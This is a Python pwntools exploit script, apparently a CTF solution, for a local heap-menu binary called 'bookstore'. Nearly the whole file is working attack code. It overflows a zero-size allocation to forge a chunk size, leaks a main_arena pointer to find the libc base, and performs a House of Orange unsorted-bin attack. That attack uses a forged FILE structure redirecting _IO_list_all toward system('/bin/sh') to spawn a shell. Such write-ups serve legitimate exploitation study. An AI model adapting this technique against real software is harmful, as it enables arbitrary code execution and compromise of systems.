#! /usr/bin/python

from pwn import *

#p = process('./bookstore',env={"LD_PRELOAD":"./libc_64.so"})
p = process('./bookstore')
elf = ELF('./bookstore')
libc = ELF('./libc_64.so')
#context.log_level = 'debug'

def add(size,cont):
    p.recvuntil('Your choice:')
    p.sendline('1')
    p.recvuntil('What is the author name?')
    p.sendline('Railgun')
    p.recvuntil('How long is the book name?')
    p.sendline(str(size))
    p.recvuntil('What is the name of the book?')
    p.sendline(cont)

def delete(idx):
    p.recvuntil('Your choice:')
    p.sendline('2')
    p.recvuntil('?')
    p.sendline(str(idx))

def show(idx):
    p.recvuntil('Your choice:')
    p.sendline('3')
    p.recvuntil('?')
    p.sendline(str(idx))


###leak libc###
add(0,'a'*0x10)#0
add(0x40,'b'*0x10)#1
add(0x40,'c'*0x10)#2
add(0x40,'d'*0x10)#3
#gdb.attach(p)

delete(0)
payload = 'A' * 0x10 + p64(0) + p64(0xa1)
add(0,payload)#overwrite chunk 1
delete(1)
add(0,'aaaaaaaa')#1

show(1)
p.recvuntil('aaaaaaaa')
main_arena = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))- 232
libc_base =main_arena  - 0x3c4b20
log.success('libc base:'+hex(libc_base))


###House Of Orange###
system = libc_base+libc.symbols['system']
sh = libc_base + libc.search("/bin/sh").next() + 0x40
io_list_all = libc_base + libc.symbols['_IO_list_all']
io_str_jump = libc_base + libc.symbols['_IO_file_jumps']+0xc0


#stream  = 'A' * 0x10  #overflow
stream  = p64(0) + p64(0x61)
stream += p64(0) + p64(io_list_all-0x10) #unsorted bin attack
stream += p64(0) + p64(1)  # _IO_write_base < #_IO_write_ptr
stream += p64(0) + p64(sh)
stream += p64(0) * 19
stream += p64(io_str_jump-8) # str_jump
stream  = stream.ljust(0xe8,'\x00')
stream += p64(system) # fp+0xe8=system

add(0,'A'*0x10+stream)


#gdb.attach(p)
###get shell###
p.sendline('1')
p.sendline('1')
p.sendline('1')
p.interactive()
